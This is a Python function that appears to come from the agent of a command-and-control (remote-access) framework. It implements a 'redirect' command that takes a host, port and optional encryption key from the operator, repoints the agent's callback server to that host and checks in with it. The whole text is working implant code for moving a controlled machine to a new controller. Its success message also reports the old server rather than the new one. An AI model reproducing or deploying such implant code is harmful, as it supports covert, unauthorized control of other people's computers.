def redirect(task_id, command):

    global redirecting
    redirecting = True
    time.sleep(int(agent.get_Sleep()))
    params = command.replace(":", " ")
    params = params.split(" ")

    if len(params) < 2:
        response = {
            'task_id': task_id,
            "user_output": "usage redirect <host:port> [OPTIONAL] <encryption_key>",
            'completed': True
        }
        responses.append(response)
        return

    else:
        ip = params[0]
        port = params[1]

        response = {
                'task_id': task_id,
                "user_output": "Redirected to {}:{}".format(agent.get_Server(), agent.get_Port()),
                'completed': True
            }
        responses.append(response)

        if len(params) > 2:
            print(colored("Setting key {}".format(params[2]), "red"))
            agent.set_Encryption_key(params[2])

        agent.set_Server("http://" + ip)
        agent.set_Port(port)
        print(colored("Switching to {}:{}".format(agent.get_Server(), agent.get_Port()), "green"))
        checkin()
        print("\t- Redirect Done")
        redirecting = False

        return